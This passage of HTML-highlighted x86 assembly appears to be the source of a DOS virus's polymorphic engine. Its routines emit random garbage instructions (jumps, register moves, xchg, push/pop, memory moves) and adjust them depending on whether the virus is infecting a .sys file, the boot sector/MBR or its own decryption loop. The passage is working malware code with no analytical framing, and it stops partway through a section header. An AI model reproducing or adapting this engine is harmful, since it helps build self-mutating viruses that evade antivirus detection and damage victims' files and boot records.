</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a conditional jump followed by some garbage code                 ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_branch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Generate a random conditional jump instruction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Save address for jump construction</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Get subroutine address</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Generate some garbage code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">

                </span><span class="sc1">;Store jump displacement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate garbage code                                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">g_generator</span><span class="sc4">:</span><span class="sc0">                        
                </span><span class="sc1">;Get a random number for fill count                </span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">   
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc1">;Min 2, max 5 opcodes</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         
</span><span class="sc5">next_fill</span><span class="sc4">:</span><span class="sc0">      
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">new_fill</span><span class="sc4">:</span><span class="sc0">       
                </span><span class="sc1">;Check for .sys file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_sys</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_building_sys</span><span class="sc0">

</span><span class="sc5">last_byte_equal</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Select the type of filler ( 01h byte instructions for .sys files )</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">end_byte_table</span><span class="sc4">-</span><span class="sc5">one_byte_table</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">

                </span><span class="sc1">;Avoid same types in a row</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_fill_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">last_byte_equal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_fill_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get one byte instruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">one_byte_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Store instruction</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">op_return</span><span class="sc0">

</span><span class="sc5">no_building_sys</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Select the type of filler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_op_table</span><span class="sc4">-</span><span class="sc5">op_table</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc1">;Do not generate int calls into boot sector or mbr decryptor</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_mbr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">eliminate_ints</span><span class="sc0">

                </span><span class="sc1">;Do not generate int calls into decryption loop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_in_loop</span><span class="sc0">

</span><span class="sc5">eliminate_ints</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">no_in_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">

                </span><span class="sc1">;Avoid same types in a row</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_fill_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">new_fill</span><span class="sc0">      
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_fill_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get subroutine address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">op_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc1">;Store return address</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">op_return</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Call subroutine</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">op_return</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_fill</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate mov reg,imm ( either 8 or 16 bit but never ax or sp,di,si or bp )³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">move_imm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">

                </span><span class="sc1">;Get a reggie</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">  

                </span><span class="sc1">;Make it a mov reg,</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">   
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">is_8bit_mov</span><span class="sc0">

                </span><span class="sc1">;Make it ax,bx cx or dx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc1">;Not ax or al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_imm</span><span class="sc0">           
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_16</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">is_8bit_mov</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">   

                </span><span class="sc1">;Is al?</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">

                </span><span class="sc1">;Yeah bomb</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_imm</span><span class="sc0"> 
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate mov reg,reg ( never to al or ax )                                ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">move_with_reg</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_16</span><span class="sc0">

                </span><span class="sc1">;Preserve reggies and 8/16 bit</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3F01h</span><span class="sc0">

                </span><span class="sc1">;Or it with addr mode and make it mov</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C08Ah</span><span class="sc0">
</span><span class="sc5">reg_test</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">is_8bit_move_with_reg</span><span class="sc0">

                </span><span class="sc1">;Make source and dest = ax,bx,cx,dx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0DBh</span><span class="sc0">

</span><span class="sc5">is_8bit_move_with_reg</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">

                </span><span class="sc1">;No mov ax, 's please    </span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">

                </span><span class="sc1">;Let's see if 2 reggies are same reggies    </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">              
                </span><span class="sc6">sal</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sal</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sal</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">

                </span><span class="sc1">;Check if reg,reg are same</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">              
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Modify a mov reg,reg into an xchg reg,reg                                 ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">reg_exchange</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Make a mov reg,reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_with_reg</span><span class="sc0">  

                </span><span class="sc1">;But then remove it</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;And take advantage of the fact the opcode is still in ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Was a 16 bit type?</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1b</span><span class="sc0">

                </span><span class="sc1">;Yeah go for an 8 bitter</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">reg_exchange</span><span class="sc0">  
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

                </span><span class="sc1">;Is one of reggies ax?</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">

                </span><span class="sc1">;Yah so bomb</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">reg_exchange</span><span class="sc0">

                </span><span class="sc1">;Else make it xchg ah,dl etc...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate push reg + pop reg                                               ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_push_pop</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_bytes_2</span><span class="sc4">-</span><span class="sc5">bytes_2</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Generate push and pop instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">bytes_2</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Do not use bx on .sys files</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_sys</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_exclude_bx</span><span class="sc0">

                </span><span class="sc1">;Check if push bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">        
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_push_pop</span><span class="sc0">

                </span><span class="sc1">;Check if pop bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_push_pop</span><span class="sc0">
</span><span class="sc5">not_exclude_bx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a mov reg,mem or mov mem,reg                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">mov_with_mem</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Get memory prefix</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_seg_reg</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Get reg ( from or to mem and 8 or 16 bits )</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_16</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3803h</span><span class="sc0">

                </span><span class="sc1">;Or it with addr mode imm 16 and make it mov</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0688h</span><span class="sc0">  
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">do_16_bit</span><span class="sc0">

                </span><span class="sc1">;Check if reg is al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">make_to_mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">all_clear_for_mem</span><span class="sc0">
</span><span class="sc5">do_16_bit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get a valid 16bit reg</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">

                </span><span class="sc1">;Check if reg is ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">all_clear_for_mem</span><span class="sc0">
</span><span class="sc5">make_to_mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Make to mem</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0">

</span><span class="sc5">all_clear_for_mem</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Get size of buffer for mem operations</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">mem_base</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Get a math instruction from / to mem                                      ³</span><span class="sc0">
